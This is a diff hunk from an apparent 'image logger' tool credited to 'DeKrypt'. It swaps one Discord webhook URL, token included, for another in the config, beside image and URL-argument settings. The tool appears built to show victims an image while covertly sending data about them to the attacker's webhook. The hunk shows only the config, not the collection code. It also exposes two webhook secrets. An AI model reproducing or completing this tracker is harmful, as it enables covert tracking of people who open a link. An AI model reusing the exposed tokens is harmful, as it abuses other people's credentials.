@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://ptb.discord.com/api/webhooks/1372575968891502753/J_wNt8FUH25-nGnUUWc1oQJjT_lcGNnqba8JZ1ATnhzDCKsOxSyRp1hJOWrfI5uQFOHZ",
+    "webhook": "https://ptb.discord.com/api/webhooks/1372577287186157628/hjLDFF6Nullpp2l3TLQLDahFVaz-fd5weT7CGMv523WpDVepalHJQlz-HPdPwn2EKmn3",
     "image": "https://cdn.readawrite.com/articles/15869/15868857/thumbnail/large.gif?2", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
